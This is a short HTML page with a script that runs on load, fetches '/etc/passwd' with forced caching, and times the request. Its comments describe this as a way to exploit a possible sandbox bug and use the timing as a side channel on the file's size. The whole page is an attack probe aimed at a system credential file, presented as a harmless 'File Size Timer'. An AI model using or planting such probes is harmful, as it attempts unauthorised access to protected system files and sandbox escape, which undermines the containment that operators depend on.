<!DOCTYPE html>
<html>
<head>
    <title>File Size Timer</title>
</head>
<body>
    <h1>Estimating File Size...</h1>
    <div id="status">Status: Loading file...</div>

    <script>
        // We will try to load the file as a Blob to force the browser to cache it.
        // A bug in the sandbox could allow this to happen, even if the file is not directly readable.
        async function estimateFileSize() {
            const filename = '/etc/passwd';
            const startTime = performance.now();
            
            try {
                // We're not reading the file, just requesting it to be put in the cache.
                const response = await fetch(filename, { cache: 'force-cache' });
                
                // If the fetch call succeeds, it's a huge victory.
                if (response.ok) {
                    const endTime = performance.now();
                    const duration = endTime - startTime;
                    document.getElementById('status').textContent = `Success! File access took: ${duration.toFixed(2)}ms.`;
                    
                    // We can correlate this duration with the file's size.
                    // This is our side-channel.
                } else {
                    document.getElementById('status').textContent = `Failed to access file. Status: ${response.status}`;
                }
            } catch (e) {
                document.getElementById('status').textContent = `Error: ${e.message}`;
            }
        }

        window.onload = function() {
            estimateFileSize();
        };
    </script>
</body>
</html>
